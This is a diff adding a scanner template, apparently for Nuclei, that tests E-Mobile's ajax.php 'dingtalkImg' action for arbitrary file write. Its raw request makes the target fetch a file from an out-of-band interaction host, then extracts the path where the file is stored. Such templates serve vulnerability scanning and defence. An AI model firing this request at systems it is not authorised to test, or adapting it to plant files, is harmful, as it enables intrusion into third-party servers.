@@ -1,0 +1,28 @@
+id: poc-yaml-emobile-ajax-dingtalkImg-upload
+info:
+  name: E-Mobile Ajax Arbitrary File Write
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog,file-write
+http:
+  - raw:
+      - |
+        GET /E-mobile/App/Ajax/ajax.php?action=dingtalkImg&result[]=http://{{interactsh-url}}/1.txt HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "attachment/"
+          - "/1.txt"
+      - type: regex
+        part: body
+        regex:
+          - "attachment\\/(\\d+)\\/1.txt"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "attachment\\/(\\d+)\\/1.txt"
